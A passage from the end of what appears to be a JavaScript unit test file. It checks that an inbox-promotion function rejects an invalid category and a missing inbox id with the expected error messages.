    assert.throws(() => sb.gs.promoteInbox_({ inboxId: 'I-old', category: 'Other' }), /Category must be/);
    assert.throws(() => sb.gs.promoteInbox_({}), /Inbox id required/);
  });
};
